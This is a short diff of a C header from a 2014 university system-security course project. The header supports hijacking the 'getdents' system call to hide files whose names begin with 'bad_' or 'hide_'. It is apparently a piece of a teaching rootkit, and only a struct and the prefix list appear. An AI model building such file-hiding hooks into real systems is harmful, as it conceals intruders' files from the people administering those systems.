@@ -1,11 +1,13 @@
 /**********************************************************
-	Last Updated: Nov 1, 2014
+	Last Updated: Nov 16, 2014
 	CSE509 System Security 2014 Fall @CS SBU
 	Written By: 
 		Hyungjoon Koo (hykoo@cs.stonybrook.edu)
 		Yaohui Chen (yaohchen@cs.stonybrook.edu)
 
-	Description: Headers for hijacking 'ls' system call
+	Description: 
+		Headers for hijacking 'getdents' system call
+		Defines a certain prefix for hiding files
 ***********************************************************/
 
 static struct dirent
@@ -16,6 +18,7 @@ static struct dirent
 //	unsigned char	d_type;
 	char		d_name[];
 };
+
 
 char *(hide_prefix[]) = {"bad_","hide_"};
 
